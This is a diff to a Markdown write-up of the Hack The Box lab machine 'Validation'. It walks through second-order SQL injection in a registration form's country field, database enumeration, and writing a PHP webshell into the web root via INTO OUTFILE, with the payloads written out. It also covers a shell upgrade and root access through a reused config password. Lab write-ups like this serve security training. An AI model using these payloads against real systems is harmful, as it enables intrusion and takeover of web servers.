@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/validation.png
-tags: ["HTB"]
+tags: ["HTB", "cookies", "sqli injection", "second-order-sqli", "sqli-file", "webshell"]
 ---
 
 # Validation
@@ -88,9 +88,71 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /config.php           (Status: 200) [Size: 0]
 
 ```
-## Foothold
 
-## User
+- Web Server
 
+![](./images/1.png)
+## Foothold/User
+- When we fill in the form, we get the following result
+
+![](./images/2.png)
+
+![](./images/3.png)
+
+- Let's start with `SQLI`
+  - No issues with `Test123'`
+  - But when I tried special chars with `country` params, the backend issued error
+    - Looks like second-order `SQLI`  - `Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way.`
+    - https://portswigger.net/kb/issues/00100210_sql-injection-second-order
+    - https://offensive360.com/second-order-sql-injection-attack/
+  - By the way, we have to use the `cookie` that's being sent to us to see the error
+    - It's `md5` hash of the username we registered
+
+![](./images/4.png)
+
+- I played around with different payloads and had success with
+  - `username=TEST&country=USA' union select 1;-- -`
+
+![](./images/5.png)
+
+![](./images/6.png)
+
+- The query `username=TEST&country=USA' union select user();-- -` resulted in
+
+![](./images/7.png)
+
+- Since now we can execute different queries, let's enumerate
+  - `username=TEST&country=USA' union select database();-- -` - `registration`
+  - `username=TEST&country=USA' union select column_name from information_schema.columns where table_name = 'registration'` - shows `username`, `userhash`, `country`, `regtime`
+    - No entries with password
+  - If we execute `username=TEST&country=USA' union select privilege_type FROM information_schema.user_privileges where grantee = "'uhc'@'localhost'";-- -`, we have `FILE` privileges
+    - We can create a `File` 
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#mysql-commands
+  - Let's test it
+  - `username=TEST&country=USA' union select "PENTEST!!!" into outfile '/var/www/html/PENTEST.txt';-- -`
+  - Don't forget to visit `account.php` with the cookie that was sent back
+
+![](./images/8.png)
+
+- Let's create `webshell`
+  - `username=TEST&country=USA' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/cmd.php';-- -`
+
+![](./images/9.png)
+
+- Reverse shell
+
+![](./images/10.png)
+
+- I didn't know that there is another way of upgrading shell
+  - `script /dev/null -c bash`
+  - The rest is the same
 
 ## Root
+- Enumeration resulted in `config.php` file
+
+![](./images/11.png)
+
+- Let's try `su -`
+  - Rooted
+
+![](./images/12.png)
